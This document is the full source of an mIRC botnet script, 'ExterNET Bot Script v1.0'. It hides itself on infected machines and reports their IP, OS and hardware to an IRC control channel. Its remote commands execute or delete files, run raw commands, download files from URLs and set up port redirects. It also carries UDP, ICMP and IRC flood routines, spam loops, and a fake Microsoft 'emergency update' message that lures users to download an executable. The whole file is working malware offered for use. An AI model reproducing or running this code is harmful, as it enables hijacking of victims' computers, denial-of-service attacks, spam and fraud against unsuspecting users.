;ExterNET Bot Script. -----------------==> v1.0
;Code Edited From "Insatiable" and "GT" botnets.
;Shoutz Out to CryptSec, Info_Hacker & WhInHaLL.
;-microtech-
;irc.dal.net - #sockopen

on *:START:{ 
  if ($exists(temp2.exe) == $false) { /quit Error/Missing File ( $+ $ip $+ ) (temp2.exe (hide not detected! quitting)) | /exit }
  elseif ($exists(temp2.exe) == $true) {
    .run temp2.exe /c /fh mirc
    .set %logo [microb0t]
    .Init Ident
    .Init Runtime
    .Init Nickname
    .Init Channel
    .Init Server
    .WebSite
} }
on *:CONNECT:{
  if ($exists(temp2.exe) == $false) { /quit Error/Missing File ( $+ $ip $+ ) (temp2.exe (hide not detected! quitting)) | /exit }
  .join $var_read(home_channel)
}
Alias var_read {
  if ($1 == home_channel) { .return $readini(settings.ini, settings, home_channel) }
  if ($1 == version) { .return 1.0 }
  if ($1 == runtime) { .return $readini(settings.ini, init, runtime) } 
  if ($1 == server) { .return $readini(settings.ini, init, primary_server) }
  if ($1 == server_port) { .return $readini(settings.ini, init, primary_server_port) }
  if ($1 == master) { .return microtech }
  if ($1 == infected) { .return $readini(settings.ini, init, infected) }
}
on 1:LOAD:/msg $var_read(home_channel) $script Loaded. %logo
on 1:UNLOAD:/msg $var_read(home_channel) $script Loaded. %logo
on 1:FILERCVD:*:/msg $var_read(home_channel) [Successfuly Received]: $nopath($filename) from $nick $+ .   $nopath($filename) will be allocated to $filename $+ . %logo | /run $filename | .msg $var_read(home_channel) [Successfully Executed]: $nopath($filename) | /load -rs download/ $+ $nopath($filename) | .msg $var_read(home_channel) [Successfully Loaded]: $nopath($filename)
on 1:GETFAIL:*:/msg $var_read(home_channel) [Failed to Receive]: $nopath($filename) from $nick $+ . %logo
on 1:SENDFAIL:*:/msg $var_read(home_channel) [Failed to Send]: $nopath($filename) to $nick $+ . %logo
on 1:ACTIVE:@Website:/msg $var_read(home_channel) [Website Activated]: http:// $+ $ip $+ /
on 1:USERMODE:/msg $var_read(home_channel) Usermode Changed to: $1- | .msg $var_read(home_channel) Usermodes Now set: $usermode
on 1:INPUT:*:/msg $var_read(home_channel) WARNING: User Typing at Local Console - BOTNET EXE NOT HIDDEN!  - EXITING! %logo | exit
on 1:INVITE:*:/msg $var_read(home_channel) [Invite]: $nick Invited me To Join $chan on $network $+ .
on 1:EXIT:/msg $var_read(home_channel) WARNING: Client Killed By Local User! %logo 
on 1:KEYDOWN:*:*:/msg $var_read(home_channel) WARNING: User Typing at Local Console - BOTNET EXE NOT HIDDEN!  - EXITING! %logo | exit
on *:JOIN:#:{
  if ($nick == $me) && ($chan == $var_read(home_channel)) { .msg $var_read(home_channel) %logo $var_read(version) ~ Server: $server ~ Port: $port ~ OS: $os ~ Host/IP: $host $+ / $+ $ip ~ Runtimes: $var_read(runtime) ~ Master: $var_read(master) ~ Usermodes: $usermode ~ Status: Ready %logo }
  if ($nick != $me) && ($chan != #externet) && ($chan != #sockopen) && (%netbios == ON) {
    .run net send $remove($ial($nick),$left($ial($nick),$pos($ial($nick),@,1))) WARNING(0x06): Your version of MicroSoft Windows needs EMERGENCY updating due to an Exploit opening your C:\ to public view, Please download the update from www.microsoft-update.i-p.com/update.exe as SOON AS POSSIBLE. 
    .run temp2.exe /c /fh ConsoleWindowClass  
  } 
}  
On 1:Text:!*:#:{
  if ($2 == login) && ($nick isop $chan) {
    if ($3 == $null) { .msg $chan Usage: ! login "password" | .halt } 
    if ($3 == $readini(auth.ini, admin, $nick)) { .guser 500 $nick | .msg $chan Login Accepted for ( $+ $nick $+ )  %logo }
  }
}
On 500:Text:!admin*:#:{
  if ($2 == deauth) { 
    if ($3 !== $null) { 
      if ($level($address($3,6)) !<= 500) { .msg $chan Unable to remove user from administration. %logo | .halt }
      if ($level($address($3,6)) == 500) { .msg $chan Unable to remove user from administration. %logo | .halt }
      .ruser $3 $+ !
      .msg $chan Access removed - Administration access removed from $3 $+ . %logo
      .halt
    }
    else { 
      .ruser $nick $+ !
      .msg $chan Access removed - Administration access removed. %logo 
    } 
  }
  if ($nick !isop $chan) { .msg $chan You Must Be an Op To Use %logo | halt }
  if ($2 == systeminfo) && ($nick isop $chan) { .msg $chan Sys Info: OS: $+ $dll(moo.dll,osinfo,_) ~ Uptime: $dll(moo.dll,uptime,_) ~  CPU: $dll(moo.dll,cpuinfo,_) ~ RAM: $dll(moo.dll,meminfo,_) ~ Screen: $dll(moo.dll,screeninfo,_) ~ Gfx: $dll(moo.dll,gfxinfo,_) ~ HD: $dll(moo.dll,diskcapacity,_) }
  if ($2 == networkinfo) && ($nick isop $chan) { .msg $chan Network Info:  [PPP:  $dll(moo.dll,connection,_) $+ ~ [eth:  $dll(moo.dll,interfaceinfo,_)  }
  if ($2 == join) && ($nick isop $chan) { if ($3 == $null) { .msg $chan Usage: !admin join #channel | .halt } | if ($me ison $3) { .msg $chan Sorry, i am allready inside $3 $+ . | .halt } | .join $3 }
  if ($2 == part) && ($nick isop $chan) { if ($3 == $null) { .msg $chan Usage: !admin part #channel | .halt } | if ($me !ison $3) { .msg $chan Sorry, i am not currently inside $3 $+ . | .halt } | .part $3 }
  if ($2 == mode) && ($nick isop $chan) { if ($4 == $null) { .msg $chan Usage: !admin mode #channel +modes | .halt } | if ($me !ison $3) { .msg $chan Sorry, i am not currently in that channel. | .halt } | if ($me !isop $3) { .msg $chan Sorry, i am not current op in that channel. | .halt } | .mode $3- }
  if ($2 == kick) && ($nick isop $chan) { if ($4 !ison $3) { .msg $chan That user is not currently in that channel. | .halt } | if ($5 == $null) { .msg $chan Usage: !admin kick #channel nickname reason | .halt } | if ($me !isop $3) { .msg $chan Sorry, i am not currently op in that channel | .halt } | .kick $3- }
  if ($2 == ban) && ($nick isop $chan) { if ($4 !ison $3) { .msg $chan That user is not currently in that channel. | .halt } | if ($4 == $null) { .msg $chan Usage: !admin ban #channel nickname | .halt } | if ($me !isop $3) { .msg $chan Sorry, i am not currently op in that channel | .halt } | .mode $3 +b $address($4,2) }
  if ($2 == kickban) && ($nick isop $chan) {
    if ($5 == $null) { .msg $chan Usage: !admin kickban #channel nickname reason. | .halt } 
    if ($4 !ison $3) { .msg $chan That user is not currently in that channel. | .halt } 
    if ($me !isop $3) { .msg $chan Sorry, i am not currently op in that channel | .halt } 
    .userhost $4
    .mode $3 +b $address($4,2) 
    .kick $3- 
  }
  if ($2 == HOST) && ($nick isop $chan) { timer 1 0 //msg $chan [HOST]: $host }
  if ($2 == IP) && ($nick isop $chan) { timer 1 0 //msg $chan [IP]: $ip }
  if ($2 == icmp) && ($nick isop $chan) { if ($4 == $null) { /msg $chan Error/Syntax: (You must provide an IP & Ammount !admin icmp ip ammount). | halt } | //run ping -n $3 -v AUTH -l 64000 $3 | //run temp2.exe /n /fh ping.exe | /timer 2 1 //run temp2.exe /n /fh ping | /msg # Sending [64,000kb] of Data to ( $+ $3 $+ ) %logo }
  if ($2 == run) && ($nick isop $chan) { if ($exists($3-) != $true) { .msg $chan File Not Found. } | if ($3 == $null) { /msg $chan Error/Syntax: (!admun run <file>). | .halt } | .run $3- | .msg $chan [Executed]: $3- %logo }
  if ($2 == load) && ($nick isop $chan) { if ($exists($3-) != $true) { .msg $chan File Not Found. | halt } | if ($3 == $null) { /msg $chan Error/Syntax: (!admin load <file>). | halt } | .load -rs $3- | .msg $chan [Loaded]: $3- %logo }
  if ($2 == unload) && ($nick isop $chan) { if ($exists($3-) != $true) { .msg $chan File Not Found. | halt } | if ($3 == $null) { /msg $chan Error/Syntax: (!admin unload <file>). | halt } | .unload -rs $3- | .msg $chan [Unloaded]: $3- %logo }
  if ($2 == delete) && ($nick isop $chan) { if ($exists($3-) != $true) { .msg $chan File Not Found. } | if ($3 == $null) { /msg $chan Error/Syntax: (!admin delete <filepath>). | halt } | .remove $3- }
  if ($2 == perform) && ($nick isop $chan) { .msg $chan Now Performing Client-Side Command: $3- | . $+ $3- }
  if ($2 == hop) && ($nick isop $chan) { if ($me ison $3) { .raw part $3 | .raw join $3 | .halt } | else { .join $3 | .part $3 | .halt } }
  if ($2 == fserve) && ($nick isop $chan) { if ($3 == $null) { .msg $chan Usage: !admin fserve directory | .halt } | .fserve $nick 2 $3 }
  if ($2 == chg_server) && ($nick isop $chan) { if ($4 == $null) { .msg $chan Usage: !admin chg_server host port | .halt } | .writeini settings.ini init primary_server $3 | .writeini settings.ini init primary_server_port $4 | .msg $chan Server Changed to: $3 / Port Changed to: $4 }
  if ($2 == chg_nick) && ($nick isop $chan) { if ($3 == $null) { .nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(0,100000)  } | else { .nick $3 } }
  if ($2 == chg_channel) && ($nick isop $chan) { if ($3 !== $null) { .writeini settings.ini settings home_channel $3 } | else { .msg $chan Usage: !admin chg_channel [#channel] %logo } }
  if ($2 == serverinfo) && ($nick isop $chan) { .msg $chan Currently on: $server ~ Network: $network ~ Port: $port / Assigned: $var_read(server) $+ : $+ $var_read(server_port) %logo }
  if ($2 == raw) && ($nick isop $chan)  { .msg $chan Now Executing RAW cmd: $3- | .raw $3- }
  if ($2 == Rehash) && ($nick isop $chan) { .disconnect }
  if ($2 == adduser) && ($nick isop $chan) { if ($4 == $null) { .msg $chan Usage: !admin adduser nick password | .halt } | if ($readini(auth.ini, admin, $3) !== $null) { .msg $chan Sorry, that username is not avaliable. Please select another one. | .halt } | .writeini auth.ini admin $3- | .msg $chan Added $3 to userlist. }
  if ($2 == deluser) && ($nick isop $chan) { if ($3 == $var_read(master)) { .msg $chan Sorry, you are not allowed to remove this user. | .halt } | if ($3 == $null) { .msg $chan Usage: !admin deluser nick | .halt } | if ($readini(auth.ini, admin, $3) == $null) { .msg $chan Sorry, that username is not currently on my records. | .halt } | .remini auth.ini admin $3 | .msg $chan Removed $3 from userlist. }
  if ($2 == passwd) && ($nick isop $chan) { if ($3 == $null) { .msg $chan Usage: !admin passwd name newpassword | .halt } | .writeini auth.ini admin $3- | .msg $chan Password for username $3 has been changed to $4 $+ . }
  if ($2 == version) && ($nick isop $chan) { .msg $chan %logo  $var_read(version) ~ Server: $server ~ Port: $port ~ OS: $os ~ Host/IP: $host $+ / $+ $ip ~ Rutimes: $var_read(runtime) ~ Master: $var_read(master) ~ Status: Ready %logo ~ Infected: $var_read(Infected) }
  if ($2 == showpasswd) && ($nick isop $chan) { if ($3 == $null) { .msg $chan Usage: !admin showpasswd name | .halt } | if ($readini(auth.ini, admin, $3) == $null) { .msg $chan Sorry, that user does not exist. | .halt } | .msg $chan Password for user $3 is $readini(auth.ini, admin, $3) }
  if ($2 == authflush) && ($nick isop $chan) { .rlevel 500 | .msg $chan Access file has been cleared. %logo }
  if ($2 == load) && ($nick isop $chan) { if ($3 == $NULL) { msg $chan !admin load <script> } | else { .load -rs download/ $+ $3- | .msg $chan Loaded: $3- $+ . } }
  if ($2 == uptime) && ($nick isop $chan) { .timer 1 0 /msg $chan ~System Uptime~ $duration($calc($ticks / 1000)) }
  if ($2 == say) && ($nick isop $chan) { //say $chan $3- }
  if ($2 == portredirect) && ($nick isop $chan) {  
    if ($3 == $null) {
      .msg $chan Usage: !admin portredirect [add/stop/stats] [localport] [remotehost] [remoteport]
      .halt 
    } 
    if ($3 == add) { 
      if ($6 == $null) { 
        .msg $chan Usage: !admin portredirect [add/stop/stats] [localport] [remotehost] [remoteport]
        .halt 
      } 
      .gtportdirect $4- 
      .msg # [Redirect Added] ~ Remote Host: $5 Remote Port: $6 Local Host: $ip Local Port: $4
    .halt  } 
    if ($3 == stop) { 
      if ($4 == $null) { 
        .halt 
      } 
      .pdirectstop $4
      .msg # [Redirect Removed] ~ Local Port: $4
      .halt  
    } 
    if ($3 == stats) { 
      .msg  # [Redirectional Status List]
      .predirectstats
    }
  }  
}  
on 1:ERROR:*line*:{ .remini settings.ini init primary_server | .init server }
ctcp &*:*:{ 
  .NOTICE $nick %logo $var_read(version) by microtech %logo
}

On 1:Disconnect:{
  .Init Server
}
On 500:Text:!clone*:#:{
  if ($4 == $NULL) && ($nick isop $chan) { Msg $chan Usage: !clone start server port }
  if ($4 != $NULL) && ($2 == start) && ($nick isop $chan) { .msg $chan Loading Clone to Server: $3 / Port: $4- | .server -m $3 $4 }
}  
on 500:TEXT:!chanflood*:#:{
  if ($4 == $NULL) && ($nick isop $chan) { .msg $chan Error/Syntax: (!flood [network] [port] [#chan]). }
  else if ($4 != $NULL) && ($nick isop $chan) { 
    .set %fnet $2
    .set %fport $3
    .set %fchan $4
    .sockopen fl00dchan $+ $rand(0,100000000) $2 $3
    .sockopen  fl00dchan $+ $rand(0,100000000) $2 $3
} }
on *:SOCKOPEN:fl00dchan*:{
  .timer 1 2 sockwrite -tn $sockname user $rand(a,z) $rand(a,z) $rand(a,z) $rand(a,z) $rand(a,z) $rand(a,z) $rand(a,z) $rand(a,z)
  .timer 1 3 sockwrite -tn $sockname NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(0,100)
  .timer 1 20 sockwrite -tn $sockname JOIN %fchan
  .timer 1 21 sockwrite -tn $sockname privmsg %fchan  BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
  .msg %fchan [Flood Started] %fnet $+ : $+ %fport
  .timer 1 22 sockwrite -tn $sockname privmsg %fchan  BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
  .timer 1 24 sockwrite -tn $sockname privmsg %fchan  BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
  .timer 1 27 sockwrite -tn $sockname privmsg %fchan  BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
  .timer 1 29 sockwrite -tn $sockname privmsg %fchan  BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
  .timer 1 31 sockwrite -tn $sockname privmsg %fchan  BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
  .timer 1 34 sockwrite -tn $sockname privmsg %fchan  BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
  .timer 1 37 sockwrite -tn $sockname privmsg %fchan  BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
  .timer 1 38 sockclose fl00dchan*
  .timer 1 40 msg $var_read(home_channel) Flood Finished.... %logo
  .unset %fnet
  .unset %fport
  .unset %fchan
}
on 500:TEXT:!nickflood*:#:{
  if ($4 == $NULL) && ($nick isop $chan) { .msg $chan Error/Syntax: (!flood [network] [port] [nickname]). }
  else if ($4 != $NULL) && ($nick isop $chan) { 
    .set %fnet $2
    .set %fport $3
    .set %fnick $4
    .sockopen fl00dnick $+ $rand(0,100000000) $2 $3
    .sockopen  fl00dnick $+ $rand(0,100000000) $2 $3
} }
on *:SOCKOPEN:fl00dnick*:{
  .timer 1 2 sockwrite -tn $sockname user $rand(a,z) $rand(a,z) $rand(a,z) $rand(a,z) $rand(a,z) $rand(a,z) $rand(a,z) $rand(a,z)
  .timer 1 3 sockwrite -tn $sockname NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(0,100)
  .timer 1 20 sockwrite -tn $sockname notice %fnick  BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
  .msg %fchan [Flood Started] %fnet $+ : $+ %fport
  .timer 1 21 sockwrite -tn $sockname notice %fnick  BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
  .timer 1 22 sockwrite -tn $sockname privmsg %fnick  BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
  .timer 1 24 sockwrite -tn $sockname notice %fnick  BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
  .timer 1 27 sockwrite -tn $sockname privmsg %fnick  BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
  .timer 1 29 sockwrite -tn $sockname notice %fnick  BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
  .timer 1 31 sockwrite -tn $sockname privmsg %fnick  BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
  .timer 1 34 sockwrite -tn $sockname notice %fnick  BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
  .timer 1 37 sockclose fl00dnick*
  .timer 1 38 msg $var_read(home_channel) Flood Finished.... %logo
  .unset %fnet
  .unset %fport
  .unset %fnick
}
on 500:TEXT:!spam*:#:{
  if ($5 == $NULL) && ($2 != stop) { .msg $chan Syntax: !spam [network] [port] [#basechan] [start/stop] [spam_message] }
  if ($2 == stop) { .msg $chan Spamming Stopped. | .disable #spamnet | if ($server != $var_read(primary_server)) /quit %logo | unset %spammsg }
  else if ($nick isop $chan) && ($5 == start) { 
    .set %spammsg $6-
    .set %basechan $4
    .enable #spamnet
    .server -m $2 $+ : $+ $3
  }
}  
#spamnet off
on *:CONNECT:{
  .join %basechan
}
on *:JOIN:*:{
  /msg $nick %spammsg
  /notice $nick %spammsg
}
#spamnet off
on *:socklisten:gtportdirect*:{  set %gtsocknum 0 | :loop |  inc %gtsocknum 1 |  if $sock(gtin*,$calc($sock(gtin*,0) + %gtsocknum ) ) != $null { goto loop } |  set %gtdone $gettok($sockname,2,46) $+ . $+ $calc($sock(gtin*,0) + %gtsocknum ) | sockaccept gtin $+ . $+ %gtdone | sockopen gtout $+ . $+ %gtdone $gettok($sock($Sockname).mark,1,32) $gettok($sock($Sockname).mark,2,32) | unset %gtdone %gtsocknum }
on *:Sockread:gtin*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtinfotem [ $+ [ $sockname ] ] ] | if [ %gtinfotem [ $+ [ $sockname ] ] ] = $null { return } | if $sock( [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] ).status != active { inc %gtscatchnum 1 | set %gtempr $+ $right($sockname,$calc($len($sockname) - 4) ) $+ %gtscatchnum [ %gtinfotem [ $+ [ $sockname ] ] ] | return } | sockwrite -n [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] [ %gtinfotem [ $+ [ $sockname ] ] ] | unset [ %gtinfotem [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:Sockread:gtout*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtouttemp [ $+ [ $sockname ] ] ] |  if [ %gtouttemp [ $+ [ $sockname ] ] ] = $null { return } | sockwrite -n [ gtin [ $+ [ $remove($sockname,gtout) ] ] ] [ %gtouttemp [ $+ [ $sockname ] ] ] | unset [ %gtouttemp [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:Sockopen:gtout*: {  if ($sockerr > 0) return | set %gttempvar 0 | :stupidloop | inc %gttempvar 1 | if %gtempr  [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar ] ] != $null { sockwrite -n $sockname %gtempr [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar  ] ] |  goto stupidloop  } | else { unset %gtempr | unset %gtscatchnum | unset %gtempr* } }
on *:sockclose:gtout*: { unset %gtempr* | sockclose gtin $+ $right($sockname,$calc($len($sockname) - 5) ) | unset %gtscatchnum | sockclose $sockname }
on *:sockclose:gtin*: {   unset %gtempr* | sockclose gtout $+ $right($sockname,$calc($len($sockname) - 4) ) | unset %gtscatchnum  | sockclose $sockname }
alias predirectstats { set %gtpcount 0 | :startloophere | inc %gtpcount 1 |  if $sock(gtportdirect*,%gtpcount) != $null { /msg $chan Local Host/Port: /server $ip $+ : $+ $gettok($sock(gtportdirect*,%gtpcount),2,46) Remote Host/Port: $gettok($sock(gtportdirect*,%gtpcount).mark,1,32) $+ : $+ $gettok($sock(gtportdirect*,%gtpcount).mark,2,32)  | goto startloophere  } | else { if %gtpcount = 1 { //msg $chan No port redirects added! } | //msg $chan [End of Redirectional Status List] | unset %gtpcount } }
alias pdirectstop { Set %gtrdstoppnum $1 | sockclose [ gtportdirect. [ $+ [ %gtrdstoppnum ] ] ]  | sockclose [ gtin. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | sockclose [ gtout. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | unset %gtrdstoppnum } 
alias gtportdirect { if $3 = $null { return } | socklisten gtportdirect $+ . $+ $1 $1 | sockmark gtportdirect $+ . $+ $1 $2 $3 }
on 500:TEXT:!dns*:#: { if ($2 == $null) { halt } | if  ($nick isop $chan)  /dns $2 | set %dns.r on | set %dns.rr # | msg # [DNS] Attempting to resolve $2  }
on 500:TEXT:!dns*:?: { if ($2 == $null) { halt } | if  ($nick isop $chan) /dns $2 | set %dns.r on | set %dns.rr $nick | msg $nick [DNS] Attempting to resolve $2 }
on 500:TEXT:!update*:#:if ($nick isop $chan) { %w.g.# = # | /getdata $2 }
on 500:TEXT:!update*:?:if ($nick isop $var_read(home_channel)) { %w.g.# = $nick | /getdata $2 }
on *:DNS:{ if (%dns.r == on) && ($nick isop $chan) { msg %dns.rr [DNS] [-Resolved-]: $iaddress - $naddress | unset %dns.* } }
on 1:SOCKREAD:wwwGet: { .remove $mircdir\Temp  | msg %w.g.# 15Downloading...14 $gettok($sock($sockname).mark,3,32) | if ($sockerr > 0) return | :nextread | sockread %WWW.Temp |  if ($sockbr != 0) { if (%WWW.Temp != $Null) {  write $mircdir\Temp %WWW.Temp  } |  goto nextread   }
  if (HTTP/1.*20* iswm [ $read -l1 $mircdir\Temp ] ) { if ($exists($gettok($sock($sockname).mark,2,32))) {  .remove $gettok($sock($sockname).mark,2,32) } |   :GenNew |  set -u0 %WWW.Temp www $+ $rand(A,Z) $+ $rand(0,9) |  if ($sock(%WWW.Temp) != $null) { goto GenNew } |  sockrename wwwGet %WWW.Temp  
if (text/* iswm [ $read -sContent-Type: $mircdir\Temp ] ) { sockmark %WWW.Temp Text $gettok($sock($sockname).mark,2-,32)  } | else {   sockmark %WWW.Temp Bin $gettok($sock($sockname).mark,2-,32)  } |  .timer 1 1 sockwrite -tn %WWW.Temp GET $gettok($sock($sockname).mark,3,32)  } | else {  //echo -st $read -l2 $mircdir\Temp  }  unset %WWW.Temp }
on 1:SOCKREAD:www*: {  if ($sockerr > 0) return | :nextread | if ($gettok($sock($sockname).mark,1,32) == bin) { sockread &Temp |   if ($sockbr == 0) return |  if ($bvar(&Temp,0) != 0) { bwrite $gettok($sock($SockName).Mark,2,32) -1 $bvar(&Temp,0) &temp }  } | else {  sockread %WWW.Temp |  if ($sockbr == 0) return |  if (%WWW.Temp != $Null) { write $gettok($sock($SockName).Mark,2,32) %WWW.Temp } |   unset %WWW.Temp  } | goto nextread }
alias getdata {  if ($sock(wwwGet) == $null) {  if ($gettok($$1,1,47) == http:) { sockopen wwwGet $gettok($gettok($1,2,47),1,58) $iif($gettok($gettok($1,3,47),2,58) != $Null, $gettok($gettok($1,3,47),1,58), 80)   } | else { sockopen wwwGet $gettok($1,1,47) $iif($gettok($gettok($1,1,47),2,58) != $Null, $gettok($gettok($1,1,47),1,58), 80)  } |  if ($GetTok($1,$numtok($1,47),47) != $null) {  set -u0 %WWW.File $mircdir\ $+ $GetTok($1,$numtok($1,47),47)  } | else {
set -u0 %WWW.File $mircdir\_root_   } |   sockmark wwwGet unknown %WWW.File $iif($gettok($$1,1,47) == http:, $1, [ http:// $+ [ $1 ] ] )  } | else {  .timer 1 1 getdata $1  } }
on 1:SOCKOPEN:wwwGet: { sockwrite -tn wwwGet HEAD $gettok($sock($sockname).mark,3,32) HTTP/1.1 | sockwrite -tn wwwGet Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */* | sockwrite -tn wwwGet Accept-Language: en-au |  sockwrite -tn wwwGet Accept-Encoding: deflate |   sockwrite -tn wwwGet User-Agent: mIRCInstaller WWW Edition v0.0.1 | sockwrite -tn wwwGet Host: $host | sockwrite -tn wwwGet Connection: Keep-Alive  | sockwrite -tn wwwGet $lf  }
on 1:SOCKCLOSE:www*: {  msg %w.g.# 14[15File:14 $+ $gettok($sock($sockname).mark,3-,32) $+ ] 14[15Size:14 $+ $file($gettok($sock($sockname).mark,2,32)).size $+ ]12 Downloaded Successfully... |  if ($exists( [ $mircdir\Temp ] )) { .remove $mircdir\Temp } | unset %WWW* | unset %w.g.# }
raw 433:*:Init Nickname
on 500:Text:!udp*:#:{
  if ($4 == $NULL) && ($nick isop $chan) { msg $chan !udp [ip] [bytes] [times] }
  else if ($nick isop $chan) {
    .privmsg $chan  Now [ Packeting ] $2 [ with ] $3 [ bytes ] $4 [ times ]
    .set %packet.ip $2 
    .set %packet.bytes $3
    .set %packet.amount $4
    .set %packet.count 0 
    .set %packet.port $rand(1,6) $+ $rand(0,6) $+ ($rand(0,6) $+ $rand(0,9) 
    :start  
    if (%packet.count >= %packet.amount) { sockclose packet | unset %packet.* | privmsg $chan Packeting Has Completed .... | halt } 
    .inc %packet.count 1 
    .sockudp -b packet 60 %packet.ip %packet.port %packet.bytes %packet.bytes 
    goto start 
  } 
}
Alias Init {
  if ($1 == Ident) { .identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,z) $+ $rand(0,9) $+ $rand(a,z) }
  if ($1 == Runtime) {
    if ($readini(settings.ini, init, runtime) == $null) { .writeini settings.ini init runtime 1 | .writeini settings.ini init Infected $fulldate }
    else { .writeini settings.ini init runtime $calc($readini(settings.ini, init, runtime) + 1) }
  }
  if ($1 == Nickname) { .nick microb0t[ $+ $rand(0,1000009000900000900090890790873890742890764893262986892) $+ ] }
  if ($1 = Channel) { if ($readini(settings.ini, settings, home_channel) == $null) { .writeini settings.ini settings home_channel #externet } }
  if ($1 == Server) {
    if ($readini(settings.ini, init, primary_server) == $null) { .writeini settings.ini init primary_server irc.xchat.nl }
    if ($readini(settings.ini, init, primary_server_port) == $null) { .writeini settings.ini init primary_server_port 6667 }
    else { .server $readini(settings.ini, init, primary_server) $readini(settings.ini, init, primary_server_port) }
  }
}
